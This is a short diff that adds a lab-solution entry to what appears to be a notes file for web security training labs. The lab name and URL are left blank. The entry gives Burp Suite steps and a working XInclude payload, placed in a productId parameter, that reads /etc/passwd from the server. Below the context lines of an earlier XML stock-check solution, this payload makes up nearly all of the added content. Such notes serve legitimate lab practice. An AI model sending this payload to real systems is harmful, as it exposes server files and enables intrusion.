@@ -12,3 +12,9 @@ solution: solution should be somewhat similar to the following:
         </productId>
     </stockCheck>
 
+[lab: ]
+url:
+solution: using burpsuite, send proxy intercept to repeater and send a request similar to the following:
+  productId=<foo xmlns:xi="http://www.w3.org/2001/XInclude">
+  <xi:include parse="text" href="file:///etc/passwd"/></foo>&storeId=1
+
